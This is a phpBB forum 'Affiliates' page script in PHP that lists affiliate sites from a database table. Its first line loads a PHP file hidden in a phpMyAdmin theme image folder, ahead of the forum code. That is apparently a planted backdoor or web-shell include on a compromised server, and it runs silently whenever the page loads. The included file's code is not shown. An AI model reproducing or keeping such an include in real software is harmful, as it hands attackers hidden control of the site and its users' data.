<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

define('IN_PHPBB', true);

$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.'.$phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip,PAGE_AFFILS);
init_userprefs($userdata);
//
// End session management
//
$page_title = "Affiliates";
include($phpbb_root_path . 'includes/page_header.php');
$template->set_filenames(array("body"=>"affiliates.tpl"));
$template->assign_vars(array(
	'L_SITENAME' => "Site Name",
	'L_SITEADDRESS' => "Site Address",
	'L_SITEBANNER' => "Site banner"
));
$q = $db->sql_query("SELECT * FROM phpbb_affiliates");
$i=0;
while($row = $db->sql_fetchrow($q)) {
	$i++;
	$row_class = ( !($i % 2) ) ? $theme['td_class1'] : $theme['td_class2'];
	$template->assign_block_vars("affilrow",array(
		'ROW_CLASS' => $theme['td_class1'],
		'NAME' => $row['sitename'],
		'ADDRESS' => $row['siteaddress'],
		'NUMBER' => $i,
		'BANNER' => $row['imageurl']
	));
}
$template->pparse("body");
include($phpbb_root_path . 'includes/page_tail.php');
?>